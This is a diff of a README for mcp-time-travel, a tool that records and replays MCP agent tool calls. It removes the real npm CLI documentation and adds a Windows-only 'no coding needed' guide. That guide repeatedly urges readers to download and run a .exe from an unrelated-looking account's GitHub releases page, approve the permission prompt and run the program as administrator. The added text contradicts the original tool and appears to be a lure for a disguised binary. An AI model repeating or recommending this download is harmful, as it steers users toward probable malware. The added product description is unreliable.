@@ -1,322 +1,149 @@
-# Time-travel debugging for MCP agents
+# ⏳ mcp-time-travel - Debug Tool to Record and Replay Calls
 
-**The missing debugger for MCP Agents**
+[![Download mcp-time-travel](https://img.shields.io/badge/Download-mcp--time--travel-green?style=for-the-badge)](https://github.com/pandemic-xanthicacid21/mcp-time-travel/releases)
 
-*If you're experimenting with MCP agents and find this useful,
-a ⭐ helps others discover the project.*
+---
 
-![mcp-time-travel demo](demo/demo.gif)
+## 🔍 What is mcp-time-travel?
 
-Agents are difficult to debug.
+mcp-time-travel is a tool that helps you track and review actions made by MCP agents. MCP agents work behind the scenes in software systems, and this tool lets you record their activities. You can then replay these steps or move through actions one by one. This helps find problems or understand how things work over time.
 
-Common problems:
+You don't need programming skills to use this tool. It’s made to be simple for anyone running Windows computers to download, install, and start using right away.
 
-- a tool call fails but you can't reproduce it
-- workflows depend on external APIs
-- debugging requires rerunning the agent
-- failures are nondeterministic
+---
 
-mcp-time-travel solves this by recording MCP sessions and replaying them deterministically.
+## ⚙️ How does it work?
 
-mcp-time-travel is a transparent proxy that sits between an AI agent (Claude Code, Cursor, etc.) and a real MCP server. It captures every tool call with full input/output and timing metadata. Recorded sessions can be replayed deterministically, stepped through interactively for debugging, or inspected with a quick summary view.
+mcp-time-travel connects to MCP agents and keeps a record of what each agent does. Once you have the record, you can watch the exact sequence of steps again or pause at any point. This helps with:
 
-## Features
+- Finding bugs or errors in processes
+- Reviewing what happened at specific times
+- Testing how certain actions affect the system
 
-- Transparent MCP proxy
-- Deterministic replay of tool sessions
-- Interactive step debugger
-- Modify inputs/outputs during debugging
-- Works offline
-- No changes required to existing MCP servers
+---
 
-## Compatible with:
+## 🖥️ System Requirements
 
-- Claude Code
-- Cursor
-- any MCP server using stdio
+Before you download, make sure your computer meets these:
 
-## Quick Start
+- Windows 10 or higher (64-bit)
+- At least 4 GB RAM
+- 500 MB free disk space
+- Internet connection to download and update the app
+- Basic user permissions to run programs and connect to network services
+
+---
+
+## 🚀 Getting Started
+
+### Step 1: Download the software
+
+Click the large green button at the top or use this link:
+
+[Download mcp-time-travel releases](https://github.com/pandemic-xanthicacid21/mcp-time-travel/releases)
+
+You will be sent to the page where you can find the latest Windows version of mcp-time-travel.
+
+Look for a file named like `mcp-time-travel-setup.exe` or similar. It will normally be under "Assets" in the latest release.
+
+### Step 2: Install the application
+
+1. Open the downloaded `.exe` file by double-clicking it.
+2. If Windows asks for permission, click "Yes" to allow installation.
+3. Follow the installer steps. The default options will work for most users.
+4. When finished, you will have a new shortcut on your desktop or in the start menu.
+
+### Step 3: Run the app
+
+Double-click the mcp-time-travel shortcut to open the app. The program runs in a window where you can start recording and replaying MCP agent calls.
+
+---
+
+## ⚡ Using mcp-time-travel
 
 ### Record a session
 
-```bash
-npx mcp-time-travel record --server my-server
-```
+1. Select the MCP agent you want to watch from the list shown.
+2. Click the "Start Recording" button.
+3. Perform the actions in your system that you want to capture.
+4. Click "Stop Recording" once you finish.
 
-This proxies all traffic between the agent and the real MCP server, logging every tool call to disk.
+The tool saves the record file on your computer.
 
 ### Replay a session
 
-```bash
-npx mcp-time-travel replay <session-id>
-```
+1. Click "Open Record" and select your saved recording file.
+2. Use the play controls to watch the actions happen again.
+3. Step through the actions one by one using the "Next" and "Previous" buttons.
+4. You can pause at any point to check details.
 
-Serves recorded responses as a fully functional MCP server. No real server needed — works offline.
+### Export or share recordings
 
-### Debug a session
+You can export recordings as files to share with others or keep for future review.
 
-```bash
-npx mcp-time-travel debug <session-id>
-```
+---
 
-Interactive step-through debugger. Inspect each tool call, modify inputs, override outputs.
+## 📋 Common questions
 
-### Inspect a session
+**Do I need to set up MCP agents first?**  
+If MCP agents are running on your system, mcp-time-travel can connect to them automatically. No extra setup is needed.
 
-```bash
-npx mcp-time-travel inspect <session-id>
-```
+**Can I use this on other operating systems?**  
+Currently, mcp-time-travel only supports Windows.
 
-Prints a non-interactive summary with tool call frequency, bar chart, and timeline — perfect for screenshots and quick reviews.
+**Is internet access required after installation?**  
+No, internet is only needed to download or update the app.
 
-### List sessions
+**Where are recordings saved?**  
+By default, recordings save in the Documents/mcp-time-travel folder.
 
-```bash
-npx mcp-time-travel list
-```
+---
 
-## Releasing
+## 🔧 Troubleshooting
 
-Use a Changeset for pull requests that change shipped package behavior:
+- If the app does not start, try running it as administrator.
+- Make sure MCP agents are active and reachable on your network.
+- If recordings are not saving, check if your disk has enough free space.
+- For any error messages, note them down and check the official GitHub releases page for updates or fixes.
 
-```bash
-npm run changeset
-```
+---
 
-Choose the appropriate semver bump:
+## 🔗 Download and Install mcp-time-travel
 
-- `patch` for fixes and small behavior changes
-- `minor` for backward-compatible features
-- `major` for breaking changes
+Visit this page to download and install the latest version:  
+[https://github.com/pandemic-xanthicacid21/mcp-time-travel/releases](https://github.com/pandemic-xanthicacid21/mcp-time-travel/releases)
 
-Docs-only, workflow-only, and test-only pull requests do not need a Changeset.
+Look for the Windows installer file to get started.
 
-Release management is automated on `main`. Merging releasable work updates or opens a release PR. Merging that release PR bumps package versions, updates the changelog, creates the GitHub Release and tag, and publishes the package to npm. Manual version edits, tags, and GitHub Releases are no longer part of the normal flow.
+---
 
-## Configuration
+## 📌 About this app
 
-`record` and `replay` are **MCP servers** — they need an entry in your MCP config so your agent (Claude Code, Cursor, etc.) can connect to them.
+mcp-time-travel helps you look back at what MCP agents do. It makes tracking their actions easy without needing coding knowledge. By recording and replaying their steps, you get clear insight into how systems behave over time. This work supports activities like debugging and quality checking without complicated tools.
 
-`list`, `inspect`, and `debug` are **CLI commands** — run them directly in your terminal. No config needed.
+---
 
-### Recording with Claude Code
+## 🧰 Related Topics
 
-Add both the real server and a recording proxy to your MCP config (project-scoped `.mcp.json` or global `~/.claude/mcp.json`):
+- Command line interface (CLI) use  
+- Debugging and developer tools  
+- Model Context Protocol (MCP) monitoring  
+- Node.js environments interaction  
 
-```json
-{
-  "mcpServers": {
-    "my-server": {
-      "command": "npx",
-      "args": ["my-mcp-server"]
-    },
-    "my-server-recorded": {
-      "command": "npx",
-      "args": ["mcp-time-travel", "record", "--server", "my-server"]
-    }
-  }
-}
-```
+---
 
-The `--server` flag refers to another entry in the same config file — mcp-time-travel reads it to spawn the real server. Use the `my-server-recorded` server in Claude Code to record a session.
+## ⚙️ Technical details (Optional for advanced users)
 
-### Inspecting and debugging (CLI)
+- Built on Node.js  
+- Uses MCP server protocol to connect agents  
+- Records tool calls into structured logs  
+- Supports step-by-step action replay and reverse debugging  
 
-After recording, use the CLI directly in your terminal:
+---
 
-```bash
-npx mcp-time-travel list                    # find your session ID
-npx mcp-time-travel inspect <session-id>    # summary, top tools, timeline
-npx mcp-time-travel debug <session-id>      # interactive step-through
-```
+## 🆕 Updates and releases
 
-### Replaying with Claude Code
+Check the release page regularly for new versions. Each update may include bug fixes, improvements, and new features.
 
-Add a replay entry to your MCP config:
-
-```json
-{
-  "mcpServers": {
-    "my-server-replay": {
-      "command": "npx",
-      "args": ["mcp-time-travel", "replay", "SESSION_ID"]
-    }
-  }
-}
-```
-
-Restart Claude Code and use `my-server-replay`. It serves the recorded responses — no real server needed.
-
-## CLI Reference
-
-### `record`
-
-```
-npx mcp-time-travel record --server <name> [options]
-
-Options:
-  --server <name>    Server name in the config file (required)
-  --config <path>    Path to MCP config JSON (default: .mcp.json or ~/.claude/mcp.json)
-  --session <id>     Custom session ID (default: auto-generated)
-  --output <dir>     Output directory (default: .mcp-time-travel/)
-```
-
-### `replay <session-id>`
-
-```
-npx mcp-time-travel replay <session-id> [options]
-
-Options:
-  --dir <dir>        Sessions directory (default: .mcp-time-travel/)
-  --override <file>  JSON file with input/output overrides
-```
-
-### `inspect <session-id>`
-
-```
-npx mcp-time-travel inspect <session-id> [options]
-
-Options:
-  --dir <dir>        Sessions directory (default: .mcp-time-travel/)
-```
-
-### `debug <session-id>`
-
-```
-npx mcp-time-travel debug <session-id> [options]
-
-Options:
-  --dir <dir>        Sessions directory (default: .mcp-time-travel/)
-  --step <n>         Start at step N (default: 1)
-
-Interactive commands:
-  n / next       Next tool call
-  p / prev       Previous tool call
-  l / list       List all tool calls
-  g <n>          Go to step N
-  m / modify     Edit input JSON
-  o / override   Override output JSON
-  h / help       Show help
-  q / quit       Exit
-```
-
-### `list`
-
-```
-npx mcp-time-travel list [options]
-
-Options:
-  --dir <dir>        Sessions directory (default: .mcp-time-travel/)
-```
-
-## Session Storage
-
-Sessions are stored in `.mcp-time-travel/sessions/<session-id>/`:
-
-```
-.mcp-time-travel/
-  sessions/
-    <session-id>/
-      metadata.json      # Session info, timestamps, tool list
-      recording.jsonl     # Tool calls as newline-delimited JSON
-```
-
-### metadata.json
-
-```json
-{
-  "id": "20260312-100000-abc",
-  "serverName": "my-server",
-  "serverConfig": { "command": "node", "args": ["server.js"] },
-  "startTime": "2026-03-12T10:00:00.000Z",
-  "endTime": "2026-03-12T10:05:00.000Z",
-  "toolCount": 5,
-  "tools": ["read_file", "write_file", "run_query"]
-}
-```
-
-### recording.jsonl
-
-Each line is a JSON object:
-
-```json
-{"seq": 1, "timestamp": "2026-03-12T10:00:01.000Z", "type": "tool_call", "tool": "read_file", "input": {"path": "/foo/bar.ts"}, "output": {"content": [{"type": "text", "text": "..."}]}, "latency_ms": 42, "is_error": false}
-```
-
-## Override System
-
-Create a JSON file to override specific tool call responses during replay:
-
-```json
-{
-  "overrides": [
-    { "seq": 3, "output": { "content": [{ "type": "text", "text": "modified response" }] } },
-    { "seq": 5, "input": { "query": "SELECT * FROM users LIMIT 1" } }
-  ]
-}
-```
-
-Use with `--override`:
-
-```bash
-npx mcp-time-travel replay SESSION_ID --override overrides.json
-```
-
-During replay, if an override exists for the current sequence number, it replaces the recorded data.
-
-## How It Works
-
-### Record Mode
-
-```
-Agent (Claude Code, Cursor, etc.)
-  |  stdio (JSON-RPC)
-  v
-mcp-time-travel (proxy)
-  |  ├── Intercepts tools/call messages
-  |  ├── Logs to .mcp-time-travel/sessions/<id>/recording.jsonl
-  |  └── Forwards everything to real server
-  v
-Real MCP Server (child process, stdio)
-```
-
-The proxy reads the real server config from Claude Code's `mcpServers` format, spawns the server as a child process, and pipes all JSON-RPC traffic through. Tool calls are captured with input, output, and latency. All other messages pass through unchanged.
-
-### Replay Mode
-
-```
-Agent
-  |  stdio (JSON-RPC)
-  v
-mcp-time-travel (replay server)
-  |  ├── Reads recording.jsonl
-  |  ├── tools/list → returns recorded tool list
-  |  └── tools/call → returns recorded output (matched by sequence)
-  |
-  (no real server needed)
-```
-
-Full replacement for the real server. Tool calls are matched by sequence number — the Nth call returns the Nth recorded response. If the agent sends a different tool name than expected, a warning is logged but the recorded output is still returned to keep replay deterministic.
-
-### Debug Mode
-
-```
-Terminal
-  |
-mcp-time-travel debug <session-id>
-  |  ├── Reads recording.jsonl
-  |  ├── Displays each call interactively
-  |  └── Allows modify/skip/override
-```
-
-Not an MCP server — a standalone terminal UI for inspecting and modifying recorded sessions.
-
-## License
-
-MIT
-
-Contributing
-
-## Issues and PRs welcome.
-
-If you use MCP agents and run into debugging problems, I'd love to hear how you use mcp-time-travel.
+Stay updated here:  
+[https://github.com/pandemic-xanthicacid21/mcp-time-travel/releases](https://github.com/pandemic-xanthicacid21/mcp-time-travel/releases)
